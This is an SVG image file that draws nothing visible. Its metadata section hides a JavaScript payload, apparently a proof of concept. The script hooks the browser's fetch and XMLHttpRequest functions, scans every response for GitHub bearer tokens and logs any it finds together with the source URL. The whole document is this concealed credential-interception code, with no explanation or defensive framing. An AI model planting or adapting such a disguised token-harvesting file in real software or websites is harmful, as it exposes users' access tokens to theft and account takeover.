<svg xmlns="http://www.w3.org/2000/svg">
  <metadata>
    <![CDATA[
      (() => {
        if (window.__BEARER_HOOKED__) return;
        window.__BEARER_HOOKED__ = true;

        const RX = /\bGitHub-Bearer\s+[A-Za-z0-9._-]{60,}\b/;

        // ── 1. Hook fetch responses (in case some APIs use fetch) ──
        const origFetch = window.fetch;
        window.fetch = new Proxy(origFetch, {
          async apply(t, th, args) {
            const res = await Reflect.apply(t, th, args);
            try {
              const clone = res.clone();
              const text  = await clone.text();
              const hit   = text.match(RX);
              if (hit) {
                console.log('%c[PoC token via response]', 'color:red;font-weight:bold;', hit[0]);
              }
            } catch {}
            return res;
          }
        });

        // ── 2. Hook XHR responses ──
        const XHR = XMLHttpRequest.prototype;
        const origOpen = XHR.open;
        const origSend = XHR.send;
        XHR.open = function(method, url) {
          this.__url = url;
          return origOpen.apply(this, arguments);
        };
        XHR.send = function(body) {
          this.addEventListener('readystatechange', () => {
            if (this.readyState === 4) {
              try {
                const text = this.responseText;
                const hit  = text.match(RX);
                if (hit) {
                  console.log(
                    '%c[PoC token via XHR response]',
                    'color:red;font-weight:bold;',
                    hit[0],
                    'from', this.__url
                  );
                }
              } catch {}
            }
          });
          return origSend.apply(this, arguments);
        };
      })();
    ]]>
  </metadata>
  <rect width="0" height="0"/>
</svg>
